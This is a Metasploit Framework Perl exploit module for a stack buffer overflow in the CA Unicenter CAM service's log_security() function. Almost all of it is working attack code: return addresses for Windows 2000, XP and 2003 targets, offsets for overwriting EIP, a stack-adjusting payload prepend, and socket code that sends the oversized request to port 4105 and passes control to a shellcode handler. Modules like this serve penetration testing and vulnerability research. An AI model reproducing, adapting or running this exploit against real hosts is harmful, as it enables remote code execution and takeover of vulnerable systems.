CA Unicenter 3.1 CAM log_security() Stack Overflow Exploit (meta)
=================================================================

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::cacam_logsecurity_win32;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	&#039;Name&#039;     => &#039;CA CAM log_security() Stack Overflow (Win32)&#039;,
	&#039;Version&#039;  => &#039;$Revision: 1.1 $&#039;,
	&#039;Authors&#039;  => [ &#039;H D Moore <hdm [at] metasploit.com>&#039; ],
	&#039;Arch&#039;     => [ &#039;x86&#039; ],
	&#039;OS&#039;       => [ &#039;win32&#039;, &#039;winnt&#039;, &#039;win2000&#039;, &#039;winxp&#039;, &#039;win2003&#039;],
	&#039;Priv&#039;     => 1,
	&#039;AutoOpts&#039; => { &#039;EXITFUNC&#039; => &#039;process&#039; },

	&#039;UserOpts&#039; =>
	  {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The target port&#039;, 4105],
	  },

	&#039;Payload&#039; =>
	  {
		&#039;Space&#039;     => 1024,
		&#039;BadChars&#039;  => "\x00",
		&#039;Prepend&#039;   => "\x81\xc4\x54\xf2\xff\xff",	# add esp, -3500
		&#039;Keys&#039;		=> [&#039;+ws2ord&#039;],
	  },

	&#039;Description&#039;  => Pex::Text::Freeform(qq{
		This module exploits a vulnerability in the CA CAM service by passing
		a long parameter to the log_security() function. The CAM service is part
		of TNG Unicenter. This module has been tested on Unicenter v3.1.
}),

	&#039;Refs&#039;    =>
	  [
	
	  ],

	&#039;DefaultTarget&#039; => 0,
	&#039;Targets&#039; =>
	  [	  
	  	# W2API.DLL @ 0x01950000 - return to ESI
		# $Header: /home/mscvs/framework/exploits/cacam_logsecurity_win32.pm,v 1.1 2005/10/15 14:13:50 hdm Exp $
		[&#039;W2API.DLL TNG 2.3&#039;, 0x01951107], 
		
		# return to ESI in ws2help.dll
		[&#039;Windows 2000 SP0-SP4 English&#039;, 0x750217ae],
		[&#039;Windows XP SP0-SP1 English&#039;,   0x71aa16e5],
		[&#039;Windows XP SP2 English&#039;,       0x71aa1b22],
		[&#039;Windows 2003 SP0 English&#039;,     0x71bf175f],
	  ],

	&#039;Keys&#039;    => [&#039;cam&#039;],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);
	my $target_idx  = $self->GetVar(&#039;TARGET&#039;);
	my $shellcode   = $self->GetVar(&#039;EncodedPayload&#039;)->Payload;
	my $target = $self->Targets->[$target_idx];

	$self->PrintLine("[*] Attempting to exploit target " . $target->[0]);


	my $s = Msf::Socket::Tcp->new
	  (
		&#039;PeerAddr&#039;  => $target_host,
		&#039;PeerPort&#039;  => $target_port,
	  );

	if ($s->IsError) {
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return;
	}

	my $pattern = Pex::Text::EnglishText(4096);

	# Offset 1016 for EIP, 1024 = ESP, 1052 = ESI
	substr($pattern, 1016, 4, pack(&#039;V&#039;, $target->[1]));
	substr($pattern, 1052, length($shellcode), $shellcode);

	my $req =
		"\xfa\xf9\x00\x10" . $pattern . "\x00";

	my $ack = $s->Recv(4, 5);
	if ($ack ne "ACK\x00") {
		$self->PrintLine("[*] The CAM service is not responding.");
		return;
	}
	$s->Send($req);
	$s->Recv(-1,1);
	$self->Handler($s);
	$s->Close();

	return;
}

1;


